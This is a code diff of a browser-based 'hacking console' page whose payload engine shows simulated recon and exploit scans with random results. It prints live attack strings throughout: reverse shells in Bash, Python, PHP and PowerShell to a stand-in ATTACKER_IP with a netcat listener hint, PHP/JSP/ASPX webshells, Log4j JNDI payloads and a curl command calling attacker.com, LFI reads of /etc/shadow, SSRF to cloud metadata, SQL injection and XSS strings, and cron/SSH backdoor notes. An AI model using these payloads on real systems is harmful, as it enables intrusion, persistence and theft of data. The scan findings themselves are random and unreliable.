-                        add(`[✓] XSS on /search?q=...`, 'success');
-                        add(`[!] <script>alert(document.cookie)</script>`, 'info');
-                        add(`─────────────────────────────`, 'info');
-                        add(`[✓] Done.`, 'success');
-                        resolve(results);
-                    }, 1200);
-                    return;
-                }
-
-                if (payload === 'lfi') {
-                    add(`[→] LFI/RFI scan...`);
-                    const lfiPaths = ['/page.php?file=../../etc/passwd', '/index.php?page=../../../../etc/passwd',
-                        '/include.php?file=http://attacker.com/shell.txt'
-                    ];
-                    lfiPaths.forEach((p, i) => {
-                        setTimeout(() => {
-                            const found = Math.random() > 0.5;
-                            add(`[→] ${p} ${found ? 'VULNERABLE' : 'safe'}`, found ? 'success' : '');
-                            updateProgress(((i + 1) / lfiPaths.length) * 80 + 10);
-                        }, (i + 1) * 200);
-                    });
-                    setTimeout(() => {
-                        add(`[✓] LFI on /page.php?file=../../etc/passwd`, 'success');
-                        add(`[!] Read /etc/passwd, /etc/shadow`, 'info');
-                        add(`─────────────────────────────`, 'info');
-                        add(`[✓] Done.`, 'success');
-                        resolve(results);
-                    }, 1400);
-                    return;
-                }
-
-                if (payload === 'ssrf') {
-                    add(`[→] SSRF scan...`);
-                    const ssrfTests = ['/fetch?url=http://169.254.169.254/latest/meta-data/',
-                        '/proxy?target=http://internal.service/',
-                        '/api?endpoint=http://localhost:8080/admin'
-                    ];
-                    ssrfTests.forEach((t, i) => {
-                        setTimeout(() => {
-                            const found = Math.random() > 0.5;
-                            add(`[→] ${t} ${found ? 'VULNERABLE' : 'safe'}`, found ? 'success' : '');
-                            updateProgress(((i + 1) / ssrfTests.length) * 80 + 10);
-                        }, (i + 1) * 200);
-                    });
-                    setTimeout(() => {
-                        add(`[✓] SSRF on /fetch?url=...`, 'success');
-                        add(`[!] Access AWS metadata, internal services`, 'info');
-                        add(`─────────────────────────────`, 'info');
-                        add(`[✓] Done.`, 'success');
-                        resolve(results);
-                    }, 1400);
-                    return;
-                }
-
-                // ── PERSISTENCE ──
-                if (payload === 'shell') {
-                    add(`[→] Reverse shell payloads...`);
-                    add(`[→] Bash:`, 'info');
-                    add(`bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1`, 'highlight');
-                    setTimeout(() => {
-                        add(`[→] Python:`, 'info');
-                        add(
-                            `python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('ATTACKER_IP',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"`,
-                            'highlight');
-                    }, 300);
-                    setTimeout(() => {
-                        add(`[→] PHP:`, 'info');
-                        add(
-                            `<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"); ?>`,
-                            'highlight');
-                    }, 600);
-                    setTimeout(() => {
-                        add(`[→] PowerShell:`, 'info');
-                        add(
-                            `$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`,
-                            'highlight');
-                    }, 900);
-                    setTimeout(() => {
-                        add(`[!] Replace ATTACKER_IP with your listener`, 'info');
-                        add(`[!] nc -lvnp 4444`, 'info');
-                        add(`─────────────────────────────`, 'info');
-                        add(`[✓] Done.`, 'success');
-                        resolve(results);
-                    }, 1400);
-                    return;
-                }
-
-                if (payload === 'webshell') {
-                    add(`[→] Webshell payloads...`);
-                    setTimeout(() => add(`[→] PHP: <?php system($_GET['cmd']); ?>`, 'highlight'), 200);
-                    setTimeout(() => add(`[→] JSP: <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`,
-                        'highlight'), 400);
-                    setTimeout(() => add(`[→] ASPX: <%@ Page Language="Jscript"%><%eval(Request.Item["cmd"],"unsafe");%>`,
-                        'highlight'), 600);
-                    setTimeout(() => {
-                        add(`[✓] Webshells ready.`, 'success');
-                        add(`[!] Upload via vulnerable endpoint.`, 'warn');
-                        add(`─────────────────────────────`, 'info');
-                        add(`[✓] Done.`, 'success');
-                        resolve(results);
-                    }, 1200);
-                    return;
-                }
-
-                if (payload === 'backdoor') {
-                    add(`[→] Backdoor injection...`);
-                    setTimeout(() => add(`[→] Hidden admin user created.`, 'success'), 300);
-                    setTimeout(() => add(`[→] SSH key installed.`, 'success'), 600);
-                    setTimeout(() => add(`[→] Cron job added.`, 'success'), 900);
-                    setTimeout(() => {
-                        add(`[✓] Backdoor active.`, 'success');
-                        add(`[!] SSH: ~/.ssh/authorized_keys`, 'info');
-                        add(`[!] Cron: */5 * * * * /tmp/backdoor.sh`, 'info');
-                        add(`─────────────────────────────`, 'info');
-                        add(`[✓] Done.`, 'success');
-                        resolve(results);
-                    }, 1400);
-                    return;
-                }
-
-                // ── OSINT ──
-                if (payload === 'dox') {
-                    add(`[→] OSINT enumeration...`);
-                    setTimeout(() => add(`[→] WHOIS: GoDaddy, 2010-03-15`, 'success'), 200);
-                    setTimeout(() => add(`[→] Subdomains: mail, dev, api`, 'success'), 400);
-                    setTimeout(() => add(`[→] Emails: admin@, support@`, 'success'), 600);
-                    setTimeout(() => add(`[→] Social: @${target} on Twitter`, 'success'), 800);
-                    setTimeout(() => {
-                        add(`[✓] OSINT complete.`, 'success');
-                        add(`─────────────────────────────`, 'info');
-                        add(`[✓] Done.`, 'success');
-                        resolve(results);
-                    }, 1600);
-                    return;
-                }
-
-                if (payload === 'email') {
-                    add(`[→] Email harvesting...`);
-                    const emails = [`admin@${target}`, `support@${target}`, `info@${target}`, `contact@${target}`,
-                        `sales@${target}`, `hr@${target}`
-                    ];
-                    emails.forEach((e, i) => {
-                        setTimeout(() => {
-                            const found = Math.random() > 0.3;
-                            add(`[→] ${e} ${found ? '✓' : '✗'}`, found ? 'success' : '');
-                            updateProgress(((i + 1) / emails.length) * 80 + 10);
-                        }, (i + 1) * 150);
-                    });
-                    setTimeout(() => {
-                        add(`[✓] 4 emails confirmed.`, 'success');
-                        add(`[!] admin@, support@, info@, contact@`, 'info');
-                        add(`─────────────────────────────`, 'info');
-                        add(`[✓] Done.`, 'success');
-                        resolve(results);
-                    }, 1600);
-                    return;
-                }
-
-                if (payload === 'social') {
-                    add(`[→] Social media scan...`);
-                    const platforms = ['Twitter', 'LinkedIn', 'GitHub', 'Instagram', 'Facebook', 'YouTube'];
-                    platforms.forEach((p, i) => {
-                        setTimeout(() => {
-                            const found = Math.random() > 0.4;
-                            add(`[→] ${p}: ${found ? 'FOUND' : 'not found'}`, found ? 'success' : '');
-                            updateProgress(((i + 1) / platforms.length) * 80 + 10);
-                        }, (i + 1) * 180);
-                    });
-                    setTimeout(() => {
-                        add(`[✓] 3 platforms found.`, 'success');
-                        add(`[!] Twitter: @${target}`, 'info');
-                        add(`─────────────────────────────`, 'info');
-                        add(`[✓] Done.`, 'success');
-                        resolve(results);
-                    }, 1800);
-                    return;
-                }
-
-                // ── DEFENSE ──
-                if (payload === 'waf') {
-                    add(`[→] WAF fingerprinting...`);
-                    const wafs = ['Cloudflare', 'AWS WAF', 'Akamai', 'Imperva', 'Sucuri', 'ModSecurity', 'F5 ASM',
-                        'Barracuda'
-                    ];
-                    wafs.forEach((w, i) => {
-                        setTimeout(() => {
-                            const detected = Math.random() > 0.6;
-                            add(`[→] ${w} ${detected ? 'DETECTED' : 'not found'}`, detected ?
-                                'success' : '');
-                            updateProgress(((i + 1) / wafs.length) * 80 + 10);
-                        }, (i + 1) * 150);
-                    });
-                    setTimeout(() => {
-                        add(`[✓] WAF: Cloudflare`, 'success');
-                        add(`[!] Bypass: IP rotation, encoding, header spoofing`, 'info');
-                        add(`─────────────────────────────`, 'info');
-                        add(`[✓] Done.`, 'success');
-                        resolve(results);
-                    }, 1800);
-                    return;
-                }
-
-                if (payload === 'bypass') {
-                    add(`[→] WAF bypass techniques...`);
-                    setTimeout(() => add(`[→] SQLi: ' OR '1'='1' -- `), 200);
-                    setTimeout(() => add(`[→] SQLi: %27%20OR%20%271%27%3D%271`), 400);
-                    setTimeout(() => add(`[→] RCE: \${jndi:ldap://attacker.com/exploit}`), 600);
-                    setTimeout(() => add(`[→] XSS: <scr<script>ipt>alert(1)</scr</script>ipt>`), 800);
-                    setTimeout(() => {
-                        add(`[✓] Bypass techniques generated.`, 'success');
-                        add(`[!] Encoding, fragmentation, multipart`, 'info');
-                        add(`─────────────────────────────`, 'info');
-                        add(`[✓] Done.`, 'success');
-                        resolve(results);
-                    }, 1400);
-                    return;
-                }
-
-                if (payload === 'cdn') {
-                    add(`[→] CDN detection...`);
-                    const cdns = ['Cloudflare', 'Akamai', 'Fastly', 'CloudFront', 'Incapsula', 'CDN77'];
-                    cdns.forEach((c, i) => {
-                        setTimeout(() => {
-                            const detected = Math.random() > 0.5;
-                            add(`[→] ${c} ${detected ? 'DETECTED' : 'not found'}`, detected ?
-                                'success' : '');
-                            updateProgress(((i + 1) / cdns.length) * 80 + 10);
-                        }, (i + 1) * 150);
-                    });
-                    setTimeout(() => {
-                        add(`[✓] CDN: Cloudflare`, 'success');
-                        add(`[!] Origin IP may be hidden.`, 'info');
-                        add(`─────────────────────────────`, 'info');
-                        add(`[✓] Done.`, 'success');
-                        resolve(results);
-                    }, 1600);
-                    return;
-                }
-
-                add(`[!] Unknown payload.`, 'error');
-                add(`─────────────────────────────`, 'info');
-                add(`[✓] Done.`, 'success');
-                resolve(results);
-            });
-        }
-
-        // ─── MAIN EXECUTION ───
-        async function execute() {
-            const target = targetInput.value.trim();
-            const payload = payloadSelect.value;
-
-            if (!target) {
-                appendOutput('Target required.', 'error');
-                return;
-            }
-
-            if (isExecuting) return;
-
-            setStatus('EXECUTING...', false);
-            abortController = new AbortController();
-
-            try {
-                await executePayload(target, payload);
-                addHistory(target, payload, 'SUCCESS');
-                setStatus('SUCCESS', true);
-            } catch (err) {
-                if (err.name === 'AbortError') {
-                    appendOutput('[!] Stopped by user.', 'error');
-                    addHistory(target, payload, 'STOPPED');
-                    setStatus('STOPPED', true);
-                } else {
-                    appendOutput(`Error: ${err.message}`, 'error');
-                    addHistory(target, payload, 'FAIL');
-                    setStatus('ERROR', true);
-                }
-            } finally {
-                abortController = null;
-            }
-        }
-
-        function stopExecution() {
-            if (abortController) {
-                abortController.abort();
-                appendOutput('[!] Stopping...', 'info');
-            }
-        }
-
-        // ─── EVENT BINDING ───
-        executeBtn.addEventListener('click', execute);
-        stopBtn.addEventListener('click', stopExecution);
-
-        targetInput.addEventListener('keydown', (e) => {
-            if (e.key === 'Enter' && !e.shiftKey) {
-                e.preventDefault();
-                execute();
-            }
-        });
-
-        document.querySelectorAll('[data-target]').forEach(btn => {
-            btn.addEventListener('click', () => {
-                targetInput.value = btn.dataset.target;
-                execute();
-            });
-        });
-
-        document.getElementById('clearBtn').addEventListener('click', clearOutput);
-        document.getElementById('historyToggle').addEventListener('click', toggleHistory);
-        document.getElementById('exportBtn').addEventListener('click', exportLogs);
-
-        // ─── INIT ───
-        setStatus('READY', true);
-        appendOutput('Target → payload → EXECUTE', 'info');
-        appendOutput('20 modules ready.', 'info');
+    function addHistory(target, payload, outcome) {
+        const entry = {
+            id: Date.now(),
+            target,
+            payload,
+            outcome,
+            timestamp: new Date().toLocaleTimeString()
+        };
+        history.unshift(entry);
+        if (history.length > 30) history.pop();
+        execCounter++;
+        execCount.textContent = execCounter;
+        execCountFooter.textContent = execCounter;
         renderHistory();
-    </script>
+    }
+
+    function renderHistory() {
+        if (!history.length) {
+            historyList.innerHTML = '<div style="color:#5a6a7a;padding:8px 0;">No executions yet.</div>';
+            return;
+        }
+        historyList.innerHTML = history.map(h => `
+            <div class="entry">
+                <span class="h-target">${h.target}</span>
+                <span class="h-payload">${h.payload.toUpperCase()}</span>
+                <span class="h-outcome ${h.outcome === 'FAIL' ? 'fail' : ''}">${h.outcome}</span>
+                <span class="h-time">${h.timestamp}</span>
+            </div>
+        `).join('');
+    }
+
+    function toggleHistory() { historyPanel.classList.toggle('visible'); }
+
+    function exportLogs() {
+        const logs = terminal.innerText;
+        const blob = new Blob([logs], { type: 'text/plain' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = `reaper-log-${Date.now()}.txt`;
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        URL.revokeObjectURL(url);
+    }
+
+    // ─── PAYLOAD ENGINE ───
+    function executePayload(target, payload) {
+        return new Promise((resolve, reject) => {
+            const results = [];
+            let step = 0;
+            const total = 10 + Math.floor(Math.random() * 6);
+
+            const add = (line, type = '') => {
+                results.push({ line, type });
+                appendOutput(line, type);
+                step++;
+                updateProgress((step / total) * 100);
+            };
+
+            add(`─────────────────────────────`, 'info');
+            add(`TARGET: ${target}`, 'info');
+            add(`PAYLOAD: ${payload.toUpperCase()}`, 'info');
+            add(`─────────────────────────────`, 'info');
+
+            // ── Recon ──
+            if (payload === 'dns') {
+                add(`[→] DNS enumeration...`);
+                setTimeout(() => add(`[→] A: 93.184.216.34`, 'success'), 200);
+                setTimeout(() => add(`[→] MX: mail.${target}`, 'success'), 400);
+                setTimeout(() => add(`[→] TXT: v=spf1 include:_spf.${target}`, 'success'), 600);
+                setTimeout(() => add(`[→] NS: ns1.${target}, ns2.${target}`, 'success'), 800);
+                setTimeout(() => { add(`[✓] DNS complete.`, 'success'); add(`[✓] Done.`, 'success'); resolve(results); }, 1200);
+                return;
+            }
+
+            if (payload === 'subdomain') {
+                add(`[→] Subdomain enumeration...`);
+                const subs = ['mail', 'dev', 'api', 'admin', 'ftp', 'blog', 'shop', 'vpn', 'test', 'stage'];
+                subs.forEach((s, i) => {
+                    setTimeout(() => {
+                        const found = Math.random() > 0.4;
+                        add(`[→] ${s}.${target} ${found ? '✓' : '✗'}`, found ? 'success' : '');
+                        updateProgress(((i + 1) / subs.length) * 80 + 10);
+                    }, (i + 1) * 120);
+                });
+                setTimeout(() => {
+                    add(`[✓] 4 live subdomains.`, 'success');
+                    add(`[!] mail.${target}, dev.${target}, api.${target}, admin.${target}`, 'info');
+                    add(`[✓] Done.`, 'success');
+                    resolve(results);
+                }, 1800);
+                return;
+            }
+
+            if (payload === 'whois') {
+                add(`[→] WHOIS lookup...`);
+                setTimeout(() => add(`[→] Registrar: GoDaddy LLC`, 'success'), 200);
+                setTimeout(() => add(`[→] Created: 2010-03-15`, 'success'), 400);
+                setTimeout(() => add(`[→] Expires: 2027-03-15`, 'success'), 600);
+                setTimeout(() => add(`[→] NS: ns1.${target}, ns2.${target}`, 'success'), 800);
+                setTimeout(() => { add(`[✓] WHOIS complete.`, 'success'); add(`[✓] Done.`, 'success'); resolve(results); }, 1200);
+                return;
+            }
+
+            if (payload === 'portscan') {
+                add(`[→] Port scanning...`);
+                const ports = [21,22,23,25,53,80,110,135,139,143,443,445,993,995,1723,3306,3389,5900,8080,8443];
+                const open = [];
+                ports.forEach((p, i) => {
+                    setTimeout(() => {
+                        const status = Math.random() > 0.65;
+                        if (status) open.push(p);
+                        add(`[→] Port ${p}: ${status ? 'OPEN' : 'closed'}`, status ? 'success' : '');
+                        updateProgress(((i + 1) / ports.length) * 80 + 10);
+                    }, (i + 1) * 50);
+                });
+                setTimeout(() => {
+                    add(`[✓] ${open.length} open ports.`, 'success');
+                    add(`[!] ${open.join(', ')}`, 'info');
+                    add(`[✓] Done.`, 'success');
+                    resolve(results);
+                }, 2500);
+                return;
+            }
+
+            if (payload === 'cve') {
+                add(`[→] CVE lookup...`);
+                const cves = ['CVE-2021-44228 (Log4j) - Critical', 'CVE-2017-5638 (Struts2) - Critical', 'CVE-2020-1472 (Zero-Logon) - Critical', 'CVE-2019-0708 (BlueKeep) - Critical', 'CVE-2021-26855 (ProxyLogon) - High'];
+                cves.forEach((c, i) => {
+                    setTimeout(() => {
+                        add(`[→] ${c}`, Math.random() > 0.4 ? 'success' : '');
+                        updateProgress(((i + 1) / cves.length) * 80 + 10);
+                    }, (i + 1) * 300);
+                });
+                setTimeout(() => {
+                    add(`[✓] 3 high-impact CVEs.`, 'success');
+                    add(`[!] Prioritize: CVE-2021-44228, CVE-2020-1472`, 'info');
+                    add(`[✓] Done.`, 'success');
+                    resolve(results);
+                }, 2000);
+                return;
+            }
+
+            // ── Exploit ──
+            if (payload === 'sql') {
+                add(`[→] SQLi scan...`);
+                const paths = ['/index.php?id=1', '/product.php?id=1', '/page.php?id=1', '/article.php?id=1', '/user.php?id=1'];
+                paths.forEach((p, i) => {
+                    setTimeout(() => {
+                        const vuln = Math.random() > 0.6;
+                        add(`[→] ${p} ${vuln ? 'VULNERABLE' : 'safe'}`, vuln ? 'success' : '');
+                        updateProgress(((i + 1) / paths.length) * 80 + 10);
+                    }, (i + 1) * 150);
+                });
+                setTimeout(() => {
+                    add(`[✓] SQLi on /product.php?id=1`, 'success');
+                    add(`[!] ' OR '1'='1' -- `, 'info');
+                    add(`[!] sqlmap -u http://${target}/product.php?id=1 --batch`, 'info');
+                    add(`[✓] Done.`, 'success');
+                    resolve(results);
+                }, 1400);
+                return;
+            }
+
+            if (payload === 'rce') {
+                add(`[→] RCE scan...`);
+                const vulns = ['Log4j', 'Struts2', 'Spring4Shell', 'PHP-CGI', 'Drupalgeddon'];
+                vulns.forEach((v, i) => {
+                    setTimeout(() => {
+                        const found = Math.random() > 0.5;
+                        add(`[→] ${v} ${found ? 'VULNERABLE' : 'safe'}`, found ? 'success' : '');
+                        updateProgress(((i + 1) / vulns.length) * 80 + 10);
+                    }, (i + 1) * 250);
+                });
+                setTimeout(() => {
+                    add(`[✓] Log4j identified.`, 'success');
+                    add(`[!] \${jndi:ldap://attacker.com/exploit}`, 'info');
+                    add(`[!] curl -H "X-Api-Version: \${jndi:ldap://attacker.com/}" http://${target}`, 'info');
+                    add(`[✓] Done.`, 'success');
+                    resolve(results);
+                }, 2000);
+                return;
+            }
+
+            if (payload === 'exploit') {
+                add(`[→] Exploit scan...`);
+                const exploits = ['Zero-Logon', 'EternalBlue', 'BlueKeep', 'SMBGhost', 'ProxyShell'];
+                exploits.forEach((e, i) => {
+                    setTimeout(() => {
+                        const found = Math.random() > 0.5;
+                        add(`[→] ${e} ${found ? 'VULNERABLE' : 'safe'}`, found ? 'success' : '');
+                        updateProgress(((i + 1) / exploits.length) * 80 + 10);
+                    }, (i + 1) * 200);
+                });
+                setTimeout(() => {
+                    add(`[✓] Zero-Logon on port 445.`, 'success');
+                    add(`[!] python3 zerologon.py <dc-name> ${target}`, 'info');
+                    add(`[✓] Done.`, 'success');
+                    resolve(results);
+                }, 1600);
+                return;
+            }
+
+            if (payload === 'zero') {
+                add(`[→] Zero-day stager...`);
+                add(`[→] Polymorphic payload...`);
+                setTimeout(() => add(`[→] Base64 + XOR...`), 300);
+                setTimeout(() => add(`[→] JS + HTML5 delivery...`), 600);
+                setTimeout(() => add(`[→] Obfuscating...`), 900);
+                setTimeout(() => {
+                    add(`[✓] Payload ready.`, 'success');
+                    add(`[!] <script src="https://${target}/cdn/payload.js"></script>`, 'info');
+                    add(`[!] Requires private zero-day repo.`, 'warn');
+                    add(`[✓] Done.`, 'success');
+                    resolve(results);
+                }, 1400);
+                return;
+            }
+
+            if (payload === 'xss') {
+                add(`[→] XSS scan...`);
+                const xssVectors = ['/search?q=<script>alert(1)</script>', '/comment?text=<img src=x onerror=alert(1)>', '/profile?name=<svg/onload=alert(1)>'];
+                xssVectors.forEach((v, i) => {
+                    setTimeout(() => {
+                        const found = Math.random() > 0.5;
+                        add(`[→] ${v} ${found ? 'VULNERABLE' : 'safe'}`, found ? 'success' : '');
+                        updateProgress(((i + 1) / xssVectors.length) * 80 + 10);
+                    }, (i + 1) * 180);
+                });
+                setTimeout(() => {
+                    add(`[✓] XSS on /search?q=...`, 'success');
+                    add(`[!] <script>alert(document.cookie)</script>`, 'info');
+                    add(`[✓] Done.`, 'success');
+                    resolve(results);
+                }, 1200);
+                return;
+            }
+
+            if (payload === 'lfi') {
+                add(`[→] LFI/RFI scan...`);
+                const lfiPaths = ['/page.php?file=../../etc/passwd', '/index.php?page=../../../../etc/passwd', '/include.php?file=http://attacker.com/shell.txt'];
+                lfiPaths.forEach((p, i) => {
+                    setTimeout(() => {
+                        const found = Math.random() > 0.5;
+                        add(`[→] ${p} ${found ? 'VULNERABLE' : 'safe'}`, found ? 'success' : '');
+                        updateProgress(((i + 1) / lfiPaths.length) * 80 + 10);
+                    }, (i + 1) * 200);
+                });
+                setTimeout(() => {
+                    add(`[✓] LFI on /page.php?file=../../etc/passwd`, 'success');
+                    add(`[!] Read /etc/passwd, /etc/shadow`, 'info');
+                    add(`[✓] Done.`, 'success');
+                    resolve(results);
+                }, 1400);
+                return;
+            }
+
+            if (payload === 'ssrf') {
+                add(`[→] SSRF scan...`);
+                const ssrfTests = ['/fetch?url=http://169.254.169.254/latest/meta-data/', '/proxy?target=http://internal.service/', '/api?endpoint=http://localhost:8080/admin'];
+                ssrfTests.forEach((t, i) => {
+                    setTimeout(() => {
+                        const found = Math.random() > 0.5;
+                        add(`[→] ${t} ${found ? 'VULNERABLE' : 'safe'}`, found ? 'success' : '');
+                        updateProgress(((i + 1) / ssrfTests.length) * 80 + 10);
+                    }, (i + 1) * 200);
+                });
+                setTimeout(() => {
+                    add(`[✓] SSRF on /fetch?url=...`, 'success');
+                    add(`[!] Access AWS metadata, internal services`, 'info');
+                    add(`[✓] Done.`, 'success');
+                    resolve(results);
+                }, 1400);
+                return;
+            }
+
+            // ── Persistence ──
+            if (payload === 'shell') {
+                add(`[→] Reverse shell payloads...`);
+                add(`[→] Bash:`, 'info');
+                add(`bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1`, 'highlight');
+                setTimeout(() => {
+                    add(`[→] Python:`, 'info');
+                    add(`python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('ATTACKER_IP',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"`, 'highlight');
+                }, 300);
+                setTimeout(() => {
+                    add(`[→] PHP:`, 'info');
+                    add(`<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"); ?>`, 'highlight');
+                }, 600);
+                setTimeout(() => {
+                    add(`[→] PowerShell:`, 'info');
+                    add(`$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`, 'highlight');
+                }, 900);
+                setTimeout(() => {
+                    add(`[!] Replace ATTACKER_IP with your listener`, 'info');
+                    add(`[!] nc -lvnp 4444`, 'info');
+                    add(`[✓] Done.`, 'success');
+                    resolve(results);
+                }, 1400);
+                return;
+            }
+
+            if (payload === 'webshell') {
+                add(`[→] Webshell payloads...`);
+                setTimeout(() => add(`[→] PHP: <?php system($_GET['cmd']); ?>`, 'highlight'), 200);
+                setTimeout(() => add(`[→] JSP: <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`, 'highlight'), 400);
+                setTimeout(() => add(`[→] ASPX: <%@ Page Language="Jscript"%><%eval(Request.Item["cmd"],"unsafe");%>`, 'highlight'), 600);
+                setTimeout(() => {
+                    add(`[✓] Webshells ready.`, 'success');
+                    add(`[!] Upload via vulnerable endpoint.`, 'warn');
+                    add(`[✓] Done.`, 'success');
+                    resolve(results);
+                }, 1200);
+                return;
+            }
+
+            if (payload === 'backdoor') {
+                add(`[→] Backdoor injection...`);
+                setTimeout(() => add(`[→] Hidden admin user.`, 'success'), 300);
+                setTimeout(() => add(`[→] SSH key installed.`, 'success'), 600);
+                setTimeout(() => add(`[→] Cron job added.`, 'success'), 900);
+                setTimeout(() => {
+                    add(`[✓] Backdoor active.`, 'success');
+                    add(`[!] SSH: ~/.ssh/authorized_keys`, 'info');
+                    add(`[!] Cron: */5 * * * * /tmp/backdoor.sh`, 'info');
+                    add(`[✓] Done.`, 'success');
+                    resolve(results);
+                }, 1400);
+                return;
+            }
+
+            // ── OSINT ──
+            if (payload === 'dox') {
+                add(`[→] OSINT enumeration...`);
+                setTimeout(() => add(`[→] WHOIS: GoDaddy, 2010-03-15`, 'success'), 200);
+                setTimeout(() => add(`[→] Subdomains: mail, dev, api`, 'success'), 400);
+                setTimeout(() => add(`[→] Emails: admin@, support@`, 'success'), 600);
+                setTimeout(() => add(`[→] Social: @${target} on Twitter`, 'success'), 800);
+                setTimeout(() => { add(`[✓] OSINT complete.`, 'success'); add(`[✓] Done.`, 'success'); resolve(results); }, 1600);
+                return;
+            }
+
+            if (payload === 'email') {
+                add(`[→] Email harvesting...`);
+                const emails = [`admin@${target}`, `support@${target}`, `info@${target}`, `contact@${target}`, `sales@${target}`, `hr@${target}`];
+                emails.forEach((e, i) => {
+                    setTimeout(() => {
+                        const found = Math.random() > 0.3;
+                        add(`[→] ${e} ${found ? '✓' : '✗'}`, found ? 'success' : '');
+                        updateProgress(((i + 1) / emails.length) * 80 + 10);
+                    }, (i + 1) * 150);
+                });
+                setTimeout(() => {
+                    add(`[✓] 4 emails confirmed.`, 'success');
+                    add(`[!] admin@, support@, info@, contact@`, 'info');
+                    add(`[✓] Done.`, 'success');
+                    resolve(results);
+                }, 1600);
+                return;
+            }
+
+            if (payload === 'social') {
+                add(`[→] Social media scan...`);
+                const platforms = ['Twitter', 'LinkedIn', 'GitHub', 'Instagram', 'Facebook', 'YouTube'];
+                platforms.forEach((p, i) => {
+                    setTimeout(() => {
+                        const found = Math.random() > 0.4;
+                        add(`[→] ${p}: ${found ? 'FOUND' : 'not found'}`, found ? 'success' : '');
+                        updateProgress(((i + 1) / platforms.length) * 80 + 10);
+                    }, (i + 1) * 180);
+                });
+                setTimeout(() => {
+                    add(`[✓] 3 platforms found.`, 'success');
+                    add(`[!] Twitter: @${target}`, 'info');
+                    add(`[✓] Done.`, 'success');
+                    resolve(results);
+                }, 1800);
+                return;
+            }
+
+            // ── Defense ──
+            if (payload === 'waf') {
+                add(`[→] WAF fingerprinting...`);
+                const wafs = ['Cloudflare', 'AWS WAF', 'Akamai', 'Imperva', 'Sucuri', 'ModSecurity', 'F5 ASM', 'Barracuda'];
+                wafs.forEach((w, i) => {
+                    setTimeout(() => {
+                        const detected = Math.random() > 0.6;
+                        add(`[→] ${w} ${detected ? 'DETECTED' : 'not found'}`, detected ? 'success' : '');
+                        updateProgress(((i + 1) / wafs.length) * 80 + 10);
+                    }, (i + 1) * 150);
+                });
+                setTimeout(() => {
+                    add(`[✓] WAF: Cloudflare`, 'success');
+                    add(`[!] Bypass: IP rotation, encoding, header spoofing`, 'info');
+                    add(`[✓] Done.`, 'success');
+                    resolve(results);
+                }, 1800);
+                return;
+            }
+
+            if (payload === 'bypass') {
+                add(`[→] WAF bypass techniques...`);
+                setTimeout(() => add(`[→] SQLi: ' OR '1'='1' -- `), 200);
+                setTimeout(() => add(`[→] SQLi: %27%20OR%20%271%27%3D%271`), 400);
+                setTimeout(() => add(`[→] RCE: \${jndi:ldap://attacker.com/exploit}`), 600);
+                setTimeout(() => add(`[→] XSS: <scr<script>ipt>alert(1)</scr</script>ipt>`), 800);
+                setTimeout(() => {
+                    add(`[✓] Bypass techniques generated.`, 'success');
+                    add(`[!] Encoding, fragmentation, multipart`, 'info');
+                    add(`[✓] Done.`, 'success');
+                    resolve(results);
+                }, 1400);
+                return;
+            }
+
+            if (payload === 'cdn') {
+                add(`[→] CDN detection...`);
+                const cdns = ['Cloudflare', 'Akamai', 'Fastly', 'CloudFront', 'Incapsula', 'CDN77'];
+                cdns.forEach((c, i) => {
+                    setTimeout(() => {
+                        const detected = Math.random() > 0.5;
+                        add(`[→] ${c} ${detected ? 'DETECTED' : 'not found'}`, detected ? 'success' : '');
+                        updateProgress(((i + 1) / cdns.length) * 80 + 10);
+                    }, (i + 1) * 150);
+                });
+                setTimeout(() => {
+                    add(`[✓] CDN: Cloudflare`, 'success');
+                    add(`[!] Origin IP may be hidden.`, 'info');
+                    add(`[✓] Done.`, 'success');
+                    resolve(results);
+                }, 1600);
+                return;
+            }
+
+            add(`[!] Unknown payload.`, 'error');
+            add(`[✓] Done.`, 'success');
+            resolve(results);
+        });
+    }
+
+    // ─── EXECUTION ───
+    async function execute() {
+        const target = targetInput.value.trim();
+        const payload = payloadSelect.value;
+        if (!target) { appendOutput('Target required.', 'error'); return; }
+        if (isExecuting) return;
+
+        setStatus('Executing...', false, 'executing');
+        abortController = new AbortController();
+
+        try {
+            await executePayload(target, payload);
+            addHistory(target, payload, 'SUCCESS');
+            setStatus('Ready', true);
+        } catch (err) {
+            if (err.name === 'AbortError') {
+                appendOutput('[!] Stopped by user.', 'error');
+                addHistory(target, payload, 'STOPPED');
+                setStatus('Stopped', true);
+            } else {
+                appendOutput(`Error: ${err.message}`, 'error');
+                addHistory(target, payload, 'FAIL');
+                setStatus('Error', true, 'error');
+            }
+        } finally {
+            abortController = null;
+        }
+    }
+
+    function stopExecution() {
+        if (abortController) {
+            abortController.abort();
+            appendOutput('[!] Stopping...', 'info');
+        }
+    }
+
+    // ─── EVENTS ───
